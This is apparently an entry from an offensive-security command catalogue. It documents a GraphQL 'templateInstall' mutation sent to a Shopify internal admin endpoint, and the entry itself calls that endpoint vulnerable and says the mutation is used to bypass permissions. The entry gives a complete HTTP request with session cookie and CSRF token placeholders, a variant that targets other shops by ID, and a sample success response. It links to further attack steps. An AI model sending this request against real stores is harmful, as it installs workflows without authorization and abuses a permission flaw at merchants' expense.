---
id: 123e4567-e89b-12d3-a456-426614174006
name: shopify-templateinstall-mutation
type: command
executor: http
data: >-
  {"operationName":"templateInstall","variables":{"templateId":"977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f","shopIds":[]},"query":"mutation
  templateInstall($templateId: ID!, $shopIds: [ID!]!) {\n
  templateInstall(templateId: $templateId, shopIds: $shopIds) {\n installed {\n
  shopId\n workflowId\n workflowVersion\n __typename\n }\n errors {\n shopId\n
  message\n __typename\n }\n __typename\n }\n}\n"}
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.790Z'
platforms:
  - Web
tags:
  - graphql
  - shopify
  - mutation
verified: false
validated: true
submitted: true
---

# shopify-templateinstall-mutation

## Command

Send as JSON body in POST request to /admin/internal/web/graphql/flow with appropriate headers.

```http
POST /admin/internal/web/graphql/flow HTTP/2
Host: example.myshopify.com
Content-Type: application/json
Cookie: _secure_admin_session_id=abc
X-Csrf-Token: token

{"operationName":"templateInstall","variables":{"templateId":"977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f","shopIds":[]},"query":"mutation templateInstall($templateId: ID!, $shopIds: [ID!]!) {\n templateInstall(templateId: $templateId, shopIds: $shopIds) {\n installed {\n shopId\n workflowId\n workflowVersion\n __typename\n }\n errors {\n shopId\n message\n __typename\n }\n __typename\n }\n}\n"}
```

## Description

GraphQL mutation to install a predefined workflow template via the vulnerable Shopify endpoint, used after discovering mutations to bypass permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| templateId | ID of the template to install (e.g., '977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f') | Yes |
| shopIds | Array of shop IDs to install on (empty array targets current shop) | Yes |

## Examples

### Basic Usage

```http
# As above, with empty shopIds for current shop
```

### Advanced Usage

```http
# Target specific shops
{"operationName":"templateInstall","variables":{"templateId":"977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f","shopIds":["gid://shopify/Shop/123"]},"query":"..."}
```

## Expected Output

JSON response with installed workflow details including shopId, workflowId, workflowVersion, or errors if template invalid.

Example: {"data":{"templateInstall":{"installed":[{"shopId":"gid://shopify/Shop/10979704928","workflowId":"240ed0ee-d099-4066-8eac-7ce777ef4fe4","workflowVersion":"acc5731a-7802-4622-857b-0191f8c0ee9d"}]}}}

## Related

- [[commands/shopify-workflowactivate-mutation]]
- [[procedures/Install-Workflow-Template-via-templateInstall]]
